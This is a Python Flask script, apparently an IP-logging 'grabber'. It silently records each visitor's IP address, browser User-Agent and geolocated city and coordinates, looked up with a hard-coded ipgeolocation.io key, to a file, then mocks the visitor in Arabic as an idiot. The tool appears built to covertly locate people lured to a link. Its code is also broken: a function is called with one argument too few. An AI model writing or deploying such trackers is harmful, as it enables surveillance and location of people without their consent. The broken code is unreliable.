from flask import Flask, request
import datetime
import requests

app = Flask(__name__)
visited_urls = []
api_key = "ca2413b271c14f71831f6e29c4816bd4"  # استبدل YOUR_API_KEY بمفتاح API الخاص بك من ipgeolocation.io

def send_notification(ip, user_agent, country, city, domain, latitude, longitude):
    now = datetime.datetime.now()
    current_time = now.strftime("%H:%M:%S")
    current_date = now.strftime("%Y-%m-%d")

    with open('user_data.txt', 'a') as file:
        file.write("Notification received:\n")
        file.write(f"Date: {current_date}\n")
        file.write(f"Time: {current_time}\n")
        file.write(f"IP address: {ip}\n")
        file.write(f"Device type: {user_agent}\n")
        file.write(f"Country: {country}\n")
        file.write(f"City: {city}\n")
        file.write(f"Latitude: {latitude}\n")
        file.write(f"domain: {domain}\n")
        file.write(f"Longitude: {longitude}\n")
        file.write(f"Visited sites: {visited_urls}\n")
        file.write("---------------------Bario Team--------------------\n")

@app.route('/', methods=['GET'])
def index():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    country = None
    city = None
    latitude = None
    longitude = None

    # استدعاء API للحصول على موقع العنوان الأيبي
    response = requests.get(f"https://api.ipgeolocation.io/ipgeo?apiKey={api_key}&ip={ip}")

    if response.status_code == 200:
        data = response.json()
        country = data.get('country_name')
        city = data.get('city')
        latitude = data.get('latitude')
        longitude = data.get('longitude')

        # إنشاء وفتح ملف لتسجيل المعلومات
        send_notification(ip, user_agent, country, city, latitude, longitude)
        return 'Your information has been recorded successfully, شكرا على معلوماتك ايها الغبي'
    else:
        return 'فشل الموقع في سحب بياناتك'

if __name__ == '__main__':
    app.run()
